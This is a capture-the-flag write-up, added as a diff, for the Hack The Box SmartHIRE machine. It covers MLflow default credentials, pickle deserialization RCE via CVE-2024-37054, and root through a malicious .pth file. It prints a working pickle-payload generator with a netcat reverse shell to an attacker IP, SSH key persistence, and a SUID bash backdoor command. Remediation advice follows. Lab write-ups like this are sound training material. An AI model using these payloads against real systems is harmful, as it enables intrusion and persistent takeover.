@@ -1,0 +1,486 @@
+```js
+export const frontmatter = {
+  title: "Hack The Box SmartHIRE Machine Writeup",
+  slug: "hack-the-box-smarthire-machine-writeup",
+  category: "HTB Machine",
+  tags: "MLflow, CVE-2024-37054, Python Pickle, .pth Files"
+  description:
+    "Complete walkthrough of the Hack The Box SmartHIRE machine, covering MLflow virtual host enumeration, default credential discovery, authenticated remote code execution via CVE-2024-37054, SSH access, Python .pth file abuse, sudo exploitation, and root access.",
+  date: "2026-09-27",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box SmartHIRE Writeup | MLflow RCE, Python Pickle & Sudo Privilege Escalation | loxcalhost",
+  description:
+    "Step-by-step Hack The Box SmartHIRE writeup demonstrating MLflow exploitation via CVE-2024-37054, malicious Python pickle deserialization for initial access, SSH key-based persistence, and privilege escalation through a writable Python plugin directory and malicious .pth file.",
+};
+```
+
+
+## Introduction
+
+SmartHire is a Linux-based target that highlights the risks of exposing machine learning infrastructure and the dangers of insecure dynamic code loading in custom operational scripts. The machine demonstrates how default credentials and unpatched vulnerabilities in data science platforms like MLflow can lead to complete system compromise. Moving from initial access to root requires an understanding of insecure deserialization in Python and the often-overlooked internal mechanisms of Python's module search path configuration.
+
+## Overview
+
+The exploitation of SmartHire begins with standard web enumeration, revealing a hidden virtual host running an instance of MLflow. By leveraging default credentials found in older documentation, access is gained to the MLflow dashboard. The application is running a version vulnerable to CVE-2024-37054, allowing for Remote Code Execution (RCE) via the upload of a malicious Python pickle file containing a reverse shell payload.
+
+After establishing a foothold as the svcweb user and stabilizing the shell via SSH, enumeration reveals a custom Python script intended for managing the MLflow service that can be run with sudo privileges without a password. The script utilizes Python's `site.addsitedir()` function to dynamically load plugins from a directory where the current user has write permissions. By dropping a malicious `.pth` file into this directory, arbitrary code is executed with root privileges during the Python interpreter's initialization phase, leading to full system compromise.
+
+## Attack Chain
+
+1. **Information Gathering:** Nmap and Gobuster reveal an exposed web server and a hidden virtual host (`models.smarthire.htb`).
+2. **Authentication Bypass / Default Credentials:** The MLflow instance is secured with basic authentication, which is bypassed using default credentials (`admin:password`).
+3. **Initial Access (CVE-2024-37054):** A dummy dataset is uploaded to trigger model training. The resulting legitimate machine learning model is overwritten via the MLflow API with a malicious serialized `.pkl` payload. Triggering a prediction deserializes the payload, yielding a reverse shell as `svcweb`.
+4. **Persistence & Stabilization:** An SSH key is appended to the `svcweb` user's authorized_keys file to establish a stable, interactive session.
+5. **Privilege Escalation:** A sudo misconfiguration allows the execution of `mlflowctl.py`. The script insecurely parses a writable plugin directory using the site module. A malicious .pth file is crafted to hijack the execution flow, copying `/bin/bash` to `/tmp` with the SUID bit set, granting root access.
+
+## Setup
+
+Download the VPN configuration file from the webpage and connect using `sudo openvpn file.ovpn`.
+
+> **NOTE:** Replace `file.ovpn` with your VPN configuration file name.
+
+To check if everything is working fine, we can use:
+```
+ping 10.129.155.226
+```
+
+Output:
+```
+PING 10.129.155.226 (10.129.155.226) 56(84) bytes of data.
+64 bytes from 10.129.155.226: icmp_seq=1 ttl=63 time=421 ms
+64 bytes from 10.129.155.226: icmp_seq=2 ttl=63 time=326 ms
+64 bytes from 10.129.155.226: icmp_seq=3 ttl=63 time=321 ms
+64 bytes from 10.129.155.226: icmp_seq=4 ttl=63 time=464 ms
+^C
+--- 10.129.155.226 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 4005ms
+rtt min/avg/max/mdev = 321.309/389.471/463.610/56.309 ms
+```
+
+Upon visiting the IP address in a browser, it redirects to `http://smarthire.htb`, but the page fails to load.
+
+Add `smarthire.htb` to `/etc/hosts` with `echo '10.129.155.226	smarthire.htb' | sudo tee -a /etc/hosts`
+
+> **NOTE:** We need to add an entry to `/etc/hosts` because the domain `smarthire.htb` is not publicly registered. When you visit the target IP in a browser using this domain, the system attempts to resolve it via public DNS servers. Since the domain does not exist publicly, DNS resolution fails. By adding the IP address and domain to `/etc/hosts`, you create a local mapping, allowing your system to resolve `smarthire.htb` to the correct IP address without relying on external DNS servers.
+
+## Enumeration
+
+Perform a Nmap port scan with version detection:
+```
+nmap -sV -T4 10.129.155.226
+```
+
+Output:
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-18 14:12 IST
+Nmap scan report for smarthire.htb (10.129.155.226)
+Host is up (0.32s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.62 seconds
+```
+
+Scan the target with whatweb:
+```
+whatweb http://smarthire.htb
+```
+
+Output:
+```
+http://smarthire.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.155.226], Script, Title[Overview | SmartHIRE], nginx[1.18.0]
+```
+
+Perform a Gobuster VHOST Scan:
+```
+gobuster vhost -u http://smarthire.htb -w wordlist.txt --append-domain
+```
+
+Output:
+```
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       http://smarthire.htb
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  wordlist.txt
+[+] User Agent:                gobuster/3.8
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+models.smarthire.htb Status: 401 [Size: 137]
+Progress: 20000 / 20000 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+> The wordlist used for subdomain enumeration can be found [here](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-20000.txt).
+
+The scan revealed a virtual host, `models.smarthire.htb`, which was not resolvable by default. To access it locally, the domain was added to `/etc/hosts` using the following command:
+```
+echo '10.129.155.226	models.smarthire.htb' | sudo tee -a /etc/hosts
+```
+
+Now, perform a Gobuster directory Scan:
+```
+gobuster dir -u http://smarthire.htb -w wordlist.txt
+```
+
+Output:
+```
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://smarthire.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                wordlist.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/logout               (Status: 302) [Size: 199] [--> /login]
+/register             (Status: 200) [Size: 6499]
+/login                (Status: 200) [Size: 6160]
+/dashboard            (Status: 302) [Size: 199] [--> /login]
+/predict              (Status: 302) [Size: 199] [--> /login]
+Progress: 62281 / 62281 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+> The wordlist used for directory enumeration can be found [here](https://github.com/Averroes/raft/blob/master/data/wordlists/raft-large-directories.txt).
+
+When visiting `http://models.smarthire.htb`, the site prompted for a username and password. Since no credentials were available, the authentication pop-up was dismissed.
+
+After dismissing the authentication dialog, the site returned the following message:
+```
+You are not authenticated. Please see https://www.mlflow.org/docs/latest/auth/index.html#authenticating-to-mlflow on how to authenticate.
+```
+
+This indicates that the site is running **MLflow**, a machine learning model management platform, and provides documentation links for authentication. The error message itself is an **information disclosure** as it reveals the technology stack (MLflow) and the expected authentication mechanism, which could be useful to an attacker.
+
+## Foothold
+
+MLflow’s current documentation lists the default credentials as `admin:password1234`, which can be verified in the [official documentation](https://mlflow.org/docs/latest/self-hosting/security/basic-http-auth/#admin-users). However, these credentials did not work on `models.smarthire.htb`. Checking [older MLflow documentation](https://mlflow.org/docs/2.12.1/auth/index.html) revealed that previous versions used `admin:password` as the default credentials, which successfully authenticated to the application.
+
+After successfully authenticating to the application, the dashboard revealed that the target was running MLflow version `2.14.1`. Further enumeration and vulnerability research identified that this version is affected by [CVE-2024-37054](https://github.com/advisories/GHSA-ghv6-9r9j-wh4j), a known vulnerability disclosed in 2024.
+
+First, sign up on smarthire.htb to obtain a valid session cookie. Once authenticated, upload a dummy dataset (data.csv) to trigger the backend to train and register a new machine learning model:
+```
+curl -X POST "http://smarthire.htb/upload_hiring_data" \
+  -H "Cookie: session=eyJjb21wYW55IjoidmV1cyIsInVzZXJfaWQiOiI0MjkxNWY3NzE1OGEiLCJ1c2VybmFtZSI6Im9uaXYifQ.ag9Dow.43u7elTb27r7Rli-MbqCSJj678I" \
+  -F "file=@data.csv" 
+```
+
+Output:
+```
+{"message":"Model trained and registered successfully","model_deleted":false,"model_info":{"creation_timestamp":1779385271912,"description":"No description","version":"1"},"registered_model":"veus-42915f77158a-model","status":"success"}
+```
+
+With the model registered, query the exposed MLflow API to retrieve the model's metadata. We need to locate the `run_id` and the artifact source path so we know exactly where the model file is stored on the server. The MLflow API is accessible using default credentials (`admin:password`):
+```
+curl "http://models.smarthire.htb/ajax-api/2.0/mlflow/registered-models/search" \
+  -H "Content-Type: application/json" \
+  -u "admin:password"
+```
+
+Output:
+```
+{
+  "registered_models": [
+    {
+      "name": "veus-42915f77158a-model",
+      "creation_timestamp": 1779385271335,
+      "last_updated_timestamp": 1779385271912,
+      "latest_versions": [
+        {
+          "name": "veus-42915f77158a-model",
+          "version": "1",
+          "creation_timestamp": 1779385271912,
+          "last_updated_timestamp": 1779385271912,
+          "current_stage": "None",
+          "description": "",
+          "source": "mlflow-artifacts:/0/9570279882484377b2f36124231ca9b3/artifacts/model",
+          "run_id": "9570279882484377b2f36124231ca9b3",
+          "status": "READY",
+          "run_link": ""
+        }
+      ]
+    }
+  ]
+}
+```
+
+The backend application will eventually deserialize the python_model.pkl file when making a prediction. Since Python's pickle library is vulnerable to arbitrary code execution upon deserialization, we can craft a malicious pickle file containing a reverse shell.
+
+In Python, the pickle library is designed to serialize and deserialize complex object structures into byte streams. When the pickle engine encounters a custom class, it looks for the magic method named **reduce** to understand how to reconstruct that object later.
+
+The **reduce** method is expected to return a tuple containing two items: a callable function, and a tuple of arguments to pass to that function. The critical security flaw arises during the deserialization phase. When the target application receives the malicious pickle file and attempts to load it, the pickle engine blindly executes the callable function with the provided arguments in order to rebuild the object in memory.
+
+By crafting a **reduce** method that returns the os.system function alongside a reverse shell command as its argument, the attacker hijacks this reconstruction process. The target server executes the operating system command immediately upon deserialization, granting remote code execution before the underlying application logic even has a chance to inspect or validate the loaded data.
+
+So, create a script named `generate_payload.py` on your attacking machine:
+```
+import os
+import pickle
+
+class MaliciousModel(object):
+    def __reduce__(self):
+        # Replace YOUR_IP with your actual tun0 IP address
+        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 4444 >/tmp/f"
+        return (os.system, (cmd,))
+
+malicious_data = pickle.dumps(MaliciousModel())
+
+with open("python_model.pkl", "wb") as f:
+    f.write(malicious_data)
+
+print("Malicious python_model.pkl generated successfully.")
+```
+
+Run the script to generate the payload:
+```
+python3 generate_payload.py
+```
+
+Using the `run_id` retrieved earlier, use the MLflow API to upload your malicious `python_model.pkl`, overwriting the legitimate model stored on the server:
+```
+curl -X PUT \
+  -H "Content-Type: application/octet-stream" \
+  --data-binary @python_model.pkl \
+  -u "admin:password" \
+  "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/9570279882484377b2f36124231ca9b3/artifacts/model/python_model.pkl"
+```
+(A successful request should return an empty JSON object `{}`)
+
+Because curl reads the file directly from your disk when using the `@` syntax, you first need to ensure the `csv` file exists in your current working directory, which can be created using the following command:
+```
+cat << 'EOF' > clean.csv
+name,skills,experience,education,position_applied,previous_company
+John Smith,"Python, SQL",60,Master's in CS,Data Scientist,TechCorp
+EOF
+```
+
+Start a netcat listener on your attacking machine to catch the reverse shell:
+```
+nc -lvnp 4444
+```
+
+Finally, trigger the `/predict` endpoint. When the backend attempts to load our overwritten model to make a prediction on `clean.csv`, it will deserialize our payload and execute the reverse shell:
+```
+curl -X POST \
+  -H "Cookie: session=eyJjb21wYW55IjoidmV1cyIsInVzZXJfaWQiOiI0MjkxNWY3NzE1OGEiLCJ1c2VybmFtZSI6Im9uaXYifQ.ag9Dow.43u7elTb27r7Rli-MbqCSJj678I" \
+  -F "file=@clean.csv;type=text/csv" \
+  "http://smarthire.htb/predict"
+```
+
+Once the reverse shell connects, the first step is to verify our current user context:
+```
+whoami
+```
+
+Output:
+```
+svcweb
+```
+
+Standard netcat shells are often unstable and lack features like tab completion or command history. To gain a fully interactive and reliable session, we can establish SSH access by dropping a public key into the svcweb user's `authorized_keys` file.
+
+On your local attacking machine, generate a new SSH key pair using the Ed25519 algorithm:
+```
+ssh-keygen -t ed25519 -f smarthire_foothold
+```
+
+Next, output the contents of the generated public key so it can be copied:
+```
+cat smarthire_foothold.pub
+```
+
+Output:
+```
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELInHAbXxu2zSZkaBHZm58u2meOIwyXp31lcQuv7JK7 loxcalhost@debian
+```
+
+Switch back to your netcat reverse shell on the target machine. You need to create the .ssh directory, append your public key to the authorized_keys file, and set the strict file permissions required by the SSH daemon:
+```
+mkdir -p ~/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELInHAbXxu2zSZkaBHZm58u2meOIwyXp31lcQuv7JK7 loxcalhost@debian" >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
+```
+
+With the public key in place, you can safely exit the unstable netcat shell and log in directly via SSH using your private key:
+```
+ssh -i smarthire_foothold svcweb@10.129.155.226
+```
+
+You now have a fully interactive and stable SSH session as the `svcweb` user, allowing for much easier enumeration and privilege escalation routing.
+
+Navigate to the `/home/svcweb` directory and read the user flag using:
+```
+cat /home/svcweb/user.txt
+```
+
+Output:
+```
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
+
+## Privilege Escalation
+
+We can lists the commands and privileges that a user is allowed to run with `sudo` with:
+```
+sudo -l
+```
+
+Output:
+```
+Matching Defaults entries for svcweb on smarthire:
+    env_reset,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User svcweb may run the following commands on smarthire:
+    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
+```
+
+The `sudo -l` output reveals that the current user `svcweb` can execute `/opt/tools/mlflow_ctl/mlflowctl.py` with sudo privileges without requiring a password.
+
+The script `/opt/tools/mlflow_ctl/mlflowctl.py` contains the following code:
+```
+#!/usr/bin/env python3                                                                                                         
+"""                                                                                                                            
+MLFLOW-CTL: Operational interface for managing the MLflow service.                                                             
+Supports a pluggable extension model for environment-specific logic.                                                           
+For changes or plugin requests, please contact the Platform Team.                                                              
+"""                                                                                                                            
+                                                                                                                               
+from pathlib import Path                                                                                                       
+import sys                                                                                                                     
+import site                                                                                                                    
+                                                                                                                               
+BASE_DIR = Path(__file__).resolve().parent                                                                                     
+PLUGINS_DIR = BASE_DIR / "plugins"                                                                                             
+
+# make plugins importable
+for path in PLUGINS_DIR.iterdir():
+    if path.is_dir():
+        site.addsitedir(str(path))
+
+def print_usage():
+    print("Usage: mlflowctl.py [status|backup-models|restart]") 
+    sys.exit(1)plugins
+
+def main():
+    import mlflow_actions, backup_models
+
+    if len(sys.argv) < 2:
+       print_usage()
+
+    action = sys.argv[1]
+
+    if action == "status":
+        mlflow_actions.check_status()
+    elif action == "backup-models":
+        print("[*] Running backup via backup_models plugin...") 
+        backup_models.run()
+    elif action == "restart":
+        mlflow_actions.restart()
+    else:
+        print(f"[!] Unknown action: {action}")
+        print_usage()
+
+if __name__ == "__main__": main()
+```
+
+Reviewing the source code of the script reveals a critical vulnerability rooted in its dynamic plugin loading architecture. The script begins with standard imports like `sys` for argument parsing and `pathlib` for file system operations, alongside a highly unusual addition::
+```
+from pathlib import Path
+import sys
+import site
+```
+
+While `sys` and `pathlib` are expected, the `site` module is typically reserved for Python's internal startup sequence to configure the module search path (`sys.path`). Invoking it manually within an operational script greatly expands the attack surface. The danger of this design choice becomes apparent a few lines later where the script actually implements the plugin system:
+```
+BASE_DIR = Path(__file__).resolve().parent
+PLUGINS_DIR = BASE_DIR / "plugins"
+
+# make plugins importable
+for path in PLUGINS_DIR.iterdir():
+    if path.is_dir():
+        site.addsitedir(str(path))
+```
+
+In this block, the script resolves the absolute path to a `plugins` directory and systematically iterates through every subdirectory it contains. During this loop, it passes each directory path directly to the `site.addsitedir()` function. This specific implementation is deeply flawed because it creates a direct execution vector. By blindly feeding directories into a path configuration function, the script opens the door for path manipulation; if an attacker has write permissions to any of the subdirectories being processed by this loop, they can leverage the `site` module's internal mechanisms to execute arbitrary code.
+
+To weaponize this dynamic loading flaw, we must understand exactly how the `site.addsitedir()` function behaves. According to Python's official documentation, when this function processes a directory, it looks for Path Configuration Files—any file ending with the `.pth` extension.
+
+While `.pth` files are typically used to append additional directories to the Python search path, they harbor a dangerous secondary feature: **if a line in a `.pth` file begins with the word `import`, the site module immediately executes that line using Python's `exec()` function.**
+
+Because the `svcweb` user belongs to the `devs` group, which has write access to the `/opt/tools/mlflow_ctl/plugins/dev` directory, all the conditions for privilege escalation are met. We do not need to hijack an existing module or wait for the main script's logic to trigger; the code execution will occur dynamically during the plugin loading loop.
+
+We navigate to the writable plugin directory and craft a malicious `.pth` file. In this example, we will write a Python one-liner that copies the `/bin/bash` binary to `/tmp` and sets the SUID bit, allowing us to drop into a root shell trivially.
+
+```
+echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")' > exploit.pth
+```
+
+> **Note:** Alternatively, a standard Python reverse shell payload can be embedded here.
+
+
+With the payload in place, we simply execute the `mlflowctl.py` script using our passwordless `sudo` privilege. The argument provided (`status`, `restart`, or even a random string) is irrelevant, because our malicious `.pth` file is evaluated during the environment setup phase, bypassing the script's intended argument validation entirely:
+```
+sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
+```
+
+As the script iterates through the plugins, `site.addsitedir()` parses `exploit.pth`, reads the `import os...` statement, and executes our system command as `root`.
+
+We can verify the execution by checking for our SUID binary and executing it with the `-p` flag (to preserve privileges) to obtain the root shell:
+```
+/tmp/rootbash -p
+```
+
+After obtaining elevated privileges, navigate to the `/root/` directory and read the root flag using:
+```
+cat /root/root.txt
+```
+
+Output:
+```
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
+
+## Remediation & Recommendations
+
+To secure the SmartHire environment, the following remediations should be implemented:
+
+- **Change Default Credentials:** The MLflow instance is currently using easily guessable default credentials. Immediate action must be taken to change the admin password to a strong, complex passphrase.
+- **Update and Patch MLflow:** The server is running MLflow version `2.14.1`, which is vulnerable to `CVE-2024-37054`. The software should be updated to the latest stable release to patch known insecure deserialization vulnerabilities.
+- **Sanitize Machine Learning Models:** Avoid loading untrusted serialized data (like Python `.pkl` files) directly into the environment. Transition to safer serialization formats such as safetensors or ONNX, which do not inherently support arbitrary code execution during deserialization.
+- **Restrict File Permissions:** The `svcweb` user (and the devs group) should not have write access to operational script directories, specifically `/opt/tools/mlflow_ctl/plugins/dev`. Enforce the Principle of Least Privilege by restricting write access to root or a dedicated deployment account.
+- **Secure Python Scripting:** The `mlflowctl.py` script must be refactored. The use of `site.addsitedir()` on user-writable directories is a severe security risk. If a plugin architecture is required, utilize Python's importlib for controlled module loading, and implement strict validation (such as checking file ownership and permissions) before loading any external code.
+
+## MITRE ATT&CK Mapping
+
+- **T1590: Gather Victim Network Information:** Nmap scanning and Virtual Host enumeration.
+- **T1078.001: Valid Accounts: Default Accounts:** Using default MLflow credentials to access the dashboard.
+- **T1190: Exploit Public-Facing Application:** Exploiting the exposed MLflow API for model overwrite.
+- **T1059.006: Command and Scripting Interpreter (Python):** Executing the malicious Python pickle payload and the `.pth` payload.
+- **T1059.004: Command and Scripting Interpreter (Unix Shell):** Triggering the reverse shell and executing the SUID bash binary.
+- **T1098.004: Account Manipulation (SSH Authorized Keys):** Adding an Ed25519 public key to the `svcweb` user's `authorized_keys` for stable SSH access.
+- **T1548.003: Abuse Elevation Control Mechanism (Sudo and Sudo Caching):** Sudo and Sudo Caching Executing the `mlflowctl.py` script via sudo without requiring a password.
+- **T1574.007: Hijack Execution Flow (Path Interception by PATH Environment Variable):** Path Interception by PATH Environment Variable Abusing Python's site module and `.pth` file evaluation to hijack the dynamic plugin loading sequence.
